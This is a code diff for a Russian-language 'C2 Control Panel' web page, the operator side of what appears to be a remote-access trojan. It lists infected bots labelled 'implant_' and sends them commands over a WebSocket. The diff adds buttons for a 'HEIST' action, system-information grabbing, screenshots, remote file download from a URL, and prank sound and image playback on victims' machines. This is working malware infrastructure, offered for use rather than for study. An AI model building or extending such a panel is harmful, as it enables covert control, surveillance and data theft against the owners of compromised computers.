@@ -2,17 +2,27 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>C2 Control Panel - ULTRA DIAGNOSTIC</title>
+    <title>C2 Control Panel - Final Version</title>
     <style>
         body { background-color: #2b2b2b; color: #dcdcdc; font-family: monospace; display: flex; margin: 0; height: 100vh; }
-        .sidebar { width: 250px; border-right: 1px solid #444; padding: 10px; background-color: #313335; }
-        .main-content { flex-grow: 1; display: flex; flex-direction: column; }
+        .sidebar { width: 250px; border-right: 1px solid #444; padding: 10px; display: flex; flex-direction: column; background-color: #313335; }
+        .main-content { flex-grow: 1; display: flex; flex-direction: column;}
         .controls-panel { padding: 20px; border-bottom: 1px solid #444; }
-        .log-panel { height: 200px; border-top: 1px solid #444; padding: 10px; overflow-y: scroll; background-color: #1e1e1e; font-size: 12px; }
+        .media-panel { padding: 20px; flex-grow: 1; overflow-y: auto; }
+        #bot-list { list-style: none; padding: 0; }
+        #bot-list li { padding: 8px; cursor: pointer; border-radius: 4px; margin-bottom: 5px; }
+        #bot-list li:hover { background-color: #444; }
+        #bot-list li.selected { background-color: #007bff; color: white; font-weight: bold; }
+        .log-panel { height: 150px; border-top: 1px solid #444; padding: 10px; overflow-y: scroll; background-color: #1e1e1e; font-size: 12px; }
         #log-output { white-space: pre-wrap; }
-        button { background-color: #444; border: 1px solid #555; color: white; padding: 10px; cursor: pointer; }
+        button { background-color: #444; border: 1px solid #555; color: white; padding: 10px 15px; text-align: center; font-size: 14px; margin: 4px 2px; cursor: pointer; border-radius: 5px; transition: background-color 0.2s; }
+        button:hover { background-color: #555; }
+        button.action { background-color: #b71c1c; }
+        button.action:hover { background-color: #d32f2f; }
+        .file-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 10px; margin-top: 10px; }
+        .file-grid button { width: 100%; background-color: #005f8c; text-overflow: ellipsis; overflow: hidden; white-space: nowrap; }
         .log-error { color: #ff5555; }
-        .log-diag { color: #00e676; }
+        h3, h4 { border-bottom: 1px solid #444; padding-bottom: 5px; }
     </style>
 </head>
 <body>
@@ -22,9 +32,33 @@
     </div>
     <div class="main-content">
         <div class="controls-panel">
-            <h3>Управление: <span id="selected-bot-name">...</span></h3>
-            <input type="range" min="0" max="100" value="50" id="volume-slider" oninput="setVolume(this.value)">
-            <button onclick="toggleMute()">Вкл/Выкл Звук</button>
+            <h3>Управление: <span id="selected-bot-name" style="color: #00e676;">...бот не выбран...</span></h3>
+            <div style="display: flex; flex-wrap: wrap; gap: 20px;">
+                <div>
+                    <h4>Системные действия</h4>
+                    <button class="action" onclick="runHeist()">Начать HEIST</button>
+                    <button class="action" onclick="runSysInfo()">Системная информация</button>
+                    <button class="action" onclick="runScreenshot()">Скриншот</button>
+                </div>
+                <div>
+                    <h4>Управление звуком</h4>
+                    <label for="volume-slider">Громкость:</label>
+                    <input type="range" min="0" max="100" value="50" id="volume-slider" oninput="setVolume(this.value)">
+                    <button onclick="toggleMute()">Вкл/Выкл Звук</button>
+                </div>
+                <div>
+                    <h4>Загрузка файлов</h4>
+                    <input type="text" id="download-url" placeholder="URL файла..." style="width: 250px;">
+                    <button onclick="downloadFile()">Загрузить</button>
+                </div>
+            </div>
+        </div>
+        <div class="media-panel">
+            <h3>Пранки и Медиа</h3>
+            <h4>Локальные звуки</h4>
+            <div id="audio-files" class="file-grid"></div>
+            <h4>Локальные изображения</h4>
+            <div id="image-files" class="file-grid"></div>
         </div>
         <div class="log-panel">
             <div id="log-output"></div>
@@ -32,53 +66,127 @@
     </div>
 
     <script>
-        let ws; let selectedBot = null;
+        let ws;
+        let selectedBot = null;
         const botList = document.getElementById('bot-list');
         const selectedBotName = document.getElementById('selected-bot-name');
         const logOutput = document.getElementById('log-output');
 
-        function log(message, type = '') {
+        function log(message, isError = false) {
             const entry = document.createElement('div');
             entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
-            if (type === 'error') entry.className = 'log-error';
-            if (type === 'diag') entry.className = 'log-diag';
+            if (isError) entry.className = 'log-error';
             logOutput.prepend(entry);
         }
 
         function connectWs() {
             log("Подключение к C2...");
-            ws = new WebSocket(`wss://${window.location.host}/ws`);
-            ws.onopen = () => { log("Соединение установлено."); ws.send(JSON.stringify({ type: 'operator' })); };
+            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+            ws = new WebSocket(`${protocol}//${window.location.host}/ws`);
+
+            ws.onopen = () => { log("Соединение с C2 установлено."); ws.send(JSON.stringify({ type: 'operator' })); };
+
             ws.onmessage = (event) => {
                 const data = JSON.parse(event.data);
-                if (data.type === 'bot_list') {
-                    const bots = data.data; botList.innerHTML = '';
-                    bots.forEach(botId => {
-                        const li = document.createElement('li'); li.textContent = botId; li.onclick = () => selectBot(botId, li);
-                        botList.appendChild(li);
-                    });
-                } else if(data.type === 'status') {
-                     log(`[${selectedBot || 'SERVER'}] ${data.data}`, data.data.startsWith('❌') ? 'error' : '');
+                switch (data.type) {
+                    case 'bot_list':
+                        updateBotList(data.data);
+                        break;
+                    case 'bot_details':
+                        displayBotDetails(data.bot_id, data.data);
+                        break;
+                    case 'status':
+                        log(`[${selectedBot || 'SERVER'}] ${data.data}`, data.data.startsWith('❌'));
+                        break;
                 }
             };
-            ws.onclose = () => { log("Соединение потеряно.", 'error'); };
+
+            ws.onclose = () => { log("Соединение с C2 потеряно. Переподключение через 5 секунд...", true); setTimeout(connectWs, 5000); };
+            ws.onerror = (e) => log("Ошибка WebSocket. Проверьте консоль браузера (F12).", true);
         }
 
-        function selectBot(botId, element) { selectedBot = botId; selectedBotName.textContent = botId; log(`Выбран бот: ${botId}`); }
+        function updateBotList(bots) {
+            const currentSelected = selectedBot;
+            botList.innerHTML = '';
+            bots.forEach(botId => {
+                const li = document.createElement('li');
+                li.textContent = botId.replace('implant_', '');
+                li.dataset.botId = botId;
+                if (botId === currentSelected) li.classList.add('selected');
+                li.onclick = () => selectBot(botId, li);
+                botList.appendChild(li);
+            });
+             if (bots.length > 0 && !bots.includes(currentSelected)) {     selectBot(bots[0], botList.firstChild);
+            } else if (bots.length === 0) {
+                selectedBot = null;
+                selectedBotName.textContent = "...бот не выбран...";
+            }
+        }
+
+        function selectBot(botId, element) {
+            if (selectedBot) {
+                const oldSelected = botList.querySelector(`li.selected`);
+                if(oldSelected) oldSelected.classList.remove('selected');
+            }
+            selectedBot = botId;
+            element.classList.add('selected');
+            selectedBotName.textContent = botId.replace('implant_', '');
+            log(`Выбран бот: ${selectedBot}`);
+            ws.send(JSON.stringify({ type: 'get_details', target_id: selectedBot }));
+        }
+
+        function displayBotDetails(botId, details) {
+            if(botId !== selectedBot) return;
+            if (details.volume !== undefined) document.getElementById('volume-slider').value = details.volume;
+            if (details.files) displayFiles(details.files);
+        }
+
+        function displayFiles(files) {
+            const audioContainer = document.getElementById('audio-files');
+            const imageContainer = document.getElementById('image-files');
+            audioContainer.innerHTML = '';
+            imageContainer.innerHTML = '';
+
+            if (files && files.audio) {
+                files.audio.forEach(filename => {
+                    const button = document.createElement('button');
+                    button.textContent = filename;
+                    button.onclick = () => playSound(filename);
+                    audioContainer.appendChild(button);
+                });
+            }
+            if (files && files.image) {
+                files.image.forEach(image => {
+                    const button = document.createElement('button');
+                    button.textContent = image.filename;
+                    // Тут можно добавить превью, если хочется
+                    // const img = document.createElement('img');
+                    // img.src = `data:image/jpeg;base64,${image.thumbnail}`;
+                    // button.prepend(img);
+                    button.onclick = () => showImage(image.filename);
+                    imageContainer.appendChild(button);
+                });
+            }
+        }
 
         function sendCommand(type, payload) {
-             if (!selectedBot) { log("Ошибка: бот не выбран!", 'error'); return; }
-             const message = { type: type, target_id: selectedBot, payload: payload };
-             log(`[DIAG] Отправляю команду: ${JSON.stringify(message)}`, 'diag');
-             ws.send(JSON.stringify(message));
+             if (!selectedBot) { log("Ошибка: бот не выбран!", true); return; }
+             ws.send(JSON.stringify({ type: type, target_id: selectedBot, payload: payload }));
         }
 
-        // --- ВОТ ТВОЯ ГРЕМУЧАЯ ФУНКЦИЯ ---
-        function setVolume(level) {
-            log(`[DIAG] Слайдер сдвинут. Уровень: ${level}`, 'diag');
-            sendCommand('command', { action: 'volume', level: level });
-        }
+        // --- ФУНКЦИИ УПРАВЛЕНИЯ ---
+        function setVolume(level) { sendCommand('command', { action: 'volume', level: level }); }
         function toggleMute() { sendCommand('command', { action: 'mute' }); }
+        function runHeist() { sendCommand('command', { action: 'heist' }); }
+        function runSysInfo() { sendCommand('command', { action: 'sysinfo' }); }
+        function runScreenshot() { sendCommand('command', { action: 'screenshot' }); }
+        function playSound(filename) { sendCommand('command', { action: 'play', filename: filename }); }
+        function showImage(filename) { sendCommand('command', { action: 'show', filename: filename }); }
+        function downloadFile() {
+            const url = document.getElementById('download-url').value;
+            if (!url) { log("URL для загрузки пуст!", true); return; }
+            sendCommand('command', { action: 'download', url: url });
+        }
 
         document.addEventListener('DOMContentLoaded', connectWs);
     </script>
